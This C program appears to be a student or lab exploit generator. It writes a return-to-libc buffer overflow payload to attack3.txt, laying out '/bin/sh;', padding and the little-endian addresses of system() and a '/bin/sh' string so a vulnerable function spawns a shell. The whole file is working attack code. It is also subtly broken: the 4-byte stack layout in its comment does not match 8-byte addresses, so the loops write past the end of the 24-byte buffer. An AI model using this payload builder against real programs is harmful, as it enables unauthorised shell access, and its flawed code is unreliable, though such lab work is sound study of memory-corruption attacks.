#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc <= 2)
    {
        fprintf(stderr, "Usage: %s <system_addr> </bin/sh addr>\n", argv[0]);
        return 1;
    }

    // if (argc <= 1)
    // {
    //     fprintf(stderr, "Usage: %s <system_addr>\n", argv[0]);
    //     return 1;
    // }

    char *end = NULL;
    size_t system_addr = (size_t)strtoull(argv[1], &end, 0);
    if (*end != '\0') {
        fprintf(stderr, "Couldnt parse number (system_addr)");
        return 1;
    }

    size_t bin_sh = (size_t)strtoull(argv[2], &end, 0);
    if (*end != '\0') {
        fprintf(stderr, "Couldnt parse number (/bin/sh)");
        return 1;
    }

    printf("<system_addr> = 0x%zx\n", system_addr);
    printf("</bin/sh addr> = 0x%zx\n", bin_sh);

    FILE* file = fopen("attack3.txt", "wb+");
    if (!file) {
        fprintf(stderr, "Couldnt open file");
        return 1;
    }

    /* 8 for local vars (buffer) of foo, 4 for old FP, 4 for ret, 4 for dummy ret, 4 for arg of system = 24 */
    static char buf[24] = { 0 };
    memset(buf, 'A', sizeof(buf));

    buf[0] = '/';
    buf[1] = 'b';
    buf[2] = 'i';
    buf[3] = 'n';
    buf[4] = '/';
    buf[5] = 's';
    buf[6] = 'h';
    buf[7] = ';';

    /* reverse byte order (on a little endian system) */
    size_t i = 0;
    for (i = 0; i < sizeof(system_addr); i++)
        buf[12 + i] = ((u_long)system_addr >> (i * 8)) & 255;

    for (i = 0; i < sizeof(bin_sh); i++)
        buf[20 + i] = ((u_long)bin_sh >> (i * 8)) & 255;

    for (i = 0; i < sizeof(buf); i++) {
        fprintf(file, "\\x%02x", (unsigned char)buf[i]);
    }

    fclose(file);
    return 0;
}
